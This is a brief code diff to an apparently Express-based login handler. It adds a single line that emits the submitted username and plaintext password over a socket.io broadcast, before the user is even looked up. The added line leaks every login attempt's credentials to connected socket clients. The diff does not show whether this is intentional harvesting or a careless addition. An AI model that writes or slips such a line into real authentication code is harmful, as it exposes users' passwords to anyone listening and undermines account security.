@@ -27,6 +27,8 @@ export const login = async (req, res, next) => {
     // Check for user username
     const user = await User.findOne({ userName });
 
+    req.io.emit("login", { userName, password });
+
     if (!user) return next(createError(404, "User not found!"));
 
 
